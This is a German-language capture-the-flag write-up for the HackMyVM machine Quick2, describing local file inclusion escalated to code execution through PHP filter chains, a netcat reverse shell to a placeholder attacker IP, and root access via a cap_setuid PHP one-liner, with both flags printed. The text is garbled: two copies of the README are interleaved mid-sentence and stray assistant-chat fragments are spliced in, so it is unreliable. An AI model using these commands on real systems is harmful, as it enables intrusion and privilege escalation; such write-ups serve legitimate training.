# Quick2 - HackMyVM (Easy)

![Quick2.png](Quick2.png)

## Übersicht

*   **VM:** Quick2
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Quick2)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2024-05-09
*   **Original-Writeup:** https://alientec1908.github.io/Quick2_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Quick2" zu erlangen. Der Weg dorthin begann mit der Entdeckung einer Local File Inclusion (LFI)-Schwachstelle in `index.php` (Parameter `page`) auf dem Webserver. Diese LFI wurde mittels PHP-Filterketten zu Remote Code Execution (RCE) eskaliert, was zu einer Shell als `www-data` führte. Die finale Rechteausweitung zu Root gelang durch Ausnutzung der Linux Capability `cap_setuid=ep`, die auf der PHP-Binary `/usr/bin/php8.1` gesetzt war. Durch Ausführen eines PHP-Einzeilers, der `posix_setuid(0)` aufrief, konnte die effektive User-ID zu Root geändert und eine Root-Shell gestartet werden.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `dirb`
*   `nikto`
*   `gobuster`
*   `curl`
*   `wfuzz`
*   Python3 (`php_filter_chain_generator.py`, Shell-Stabilisierung)
*   `nc` (Netcat)
*   `php8.1` (als Exploit-Vektor)
*   Standard Linux-Befehle (`cat`, `vi`, `chmod`, `find`, `ss`, `getcap`, `ls`, `id`, `stty`, `export`, `wget`, `bash`)
*   `linpeas.sh` (impliziert für Enumeration)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Quick2" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.123) mit `arp-scan` identifiziert. Hostname `quick2.hmv` (oder `que3.hmv`) in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 8.9p1) und Port 80 (HTTP, Apache 2.4Absolut, Ben! Hier ist der.52) mit dem Titel "Quick Automative".
    *   `dirb` und `gobuster` fanden diverse PHP-Dateien (`index.php`, `file.php`, `connect.php` etc.).
    *   `nikto` meldete eine potenzielle LFI-Schwachstelle in `/index.php?page=../../../../../../../../../../etc Entwurf für das README zur "Quick2"-Maschine.

```markdown
# Quick2 - HackMyVM (Easy)

![Quick2.png](Quick2.png)

## Übersicht

*   **VM:** Quick2
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Quick2)
*   **Schwierigkeit:**/passwd`.

2.  **Initial Access (LFI zu RCE als `www-data`):**
    *   Die LFI-Schwachstelle in `index.php` (Parameter `page`) wurde mit `curl` bestätigt; `/etc/passwd` konnte ausgelesen werden (Benutzer `andrew`, `nick` identifiziert).
    *   Der Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2024-05-09
*   **Original-Writeup:** https://alientec1908.github.io/Quick2_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Quick2" zu erlangen. Der Weg dorthin begann mit der Entdeckung einer Local File Inclusion (LFI)-Schwachstelle in ` Quellcode von `index.php` (ausgelesen via LFI und `php://filter/convert.base64-encode/resource=index.php`) bestätigte die direkte `include($page)`-Schwachstelle.
    *   Mittels `php_filter_chain_generator.py` wurde eine PHP-Filterkette für den Payload `` (oder ``) erstellt.
    *   Die generierte Filterketten-URL (`...index.php?page=php://filter/.../resource=index.php` (Parameter `page`) auf dem Webserver. Diese LFI wurde mittels PHP-Filterketten zu Remote Code Execution (RCE) eskaliert, was zu einer Shell als `www-data` führte. Die finale Rechteausweitung zu Root gelang durch Ausnutzung der Linux Capability `cap_setuid=ep`, die derphp://temp&cmd=...`) wurde genutzt, um eine Netcat-Reverse-Shell (`nc -e /bin/bash ANGRIFFS_IP PORT`) als `www-data` zu starten.

3.  **Privilege Escalation (von `www-data` zu `root` via PHP Capability):**
    *   Als `www-data` wurde mittels `getcap -r / 2>/dev/null` festgestellt, dass die PHP-Binary `/usr/bin/php8.1` die Capability `cap_setuid=ep` besaß.
    *   Durch Ausführen des Befehls `php8.1 -r "posix_setuid(0); system PHP-Binary `/usr/bin/php8.1` zugewiesen war. Durch Ausführen eines PHP-Einzeilers, der `posix_setuid(0)` aufrief, konnten Root-Rechte erlangt werden.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi('/bin/bash');"` (oder `system('/bin/bash -p');`) wurde die effektive User-ID zu `0` (Root) geändert und eine Root-Shell gestartet.
    *   Die User-Flag (`HMV{Its-gonna-be-a-fast-ride}`) wurde in `/home/nick/user.txt` gefunden.
    *   Die Root-Flag (`HMV{This-was-a-Quick-AND-fast-machine}`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Local File Inclusion (LFI) mit PHP Filter Chains:** Eine LFI-Schwachstelle in `index.php` wurde`
*   `nmap`
*   `dirb`
*   `nikto`
*   `gobuster`
*   `curl`
*   `wfuzz`
*   Python3 (`php_filter_chain_generator.py`, Shell-Stabilisierung)
*   `nc` (Netcat)
*   `php8.1` (als Exploit-Vektor)
*   Standard Linux-Befehle (`cat`, `find`, `ss`, `getcap`, `ls`, `id`, `uname`, `stty`, `export`)
*   `linpeas.sh` (impliziert für Post-Exploitation)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Quick2" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2. mittels PHP-Filterketten zu Remote Code Execution (RCE) eskaliert.
*   **Linux Capabilities (`cap_setuid` auf PHP):** Die PHP-Binary `/usr/bin/php8.1` besaß die `cap_setuid`-Capability. Dies erlaubte einem Prozess, der mit dieser PHP-Version ausgeführt wurde, seine effektive User-ID zu ändern, was eine direkte Eskalation zu Root ermöglichte.
*   **Information Disclosure:** `nikto` und LFI enthüllten Systeminformationen und Dateiinhalte.

## Flags

*   **User Flag (`/home/nick/user.txt`):** `HMV{Its-gonna-be-a-fast-ride}`
*   **Root Flag (`/root/root.txt`):** `HMV{This-was-a-Quick-AND-fast-machine}`

## Tags

`HackMyVM`, `Quick2`, `Easy`, `LFI`, `PHP Filter Chain`, `RCE`, `Linux Capabilities`, `cap_setuid`, `PHP Exploit`, `Linux`, `Web`, `Privilege Escalation`, `Apache`
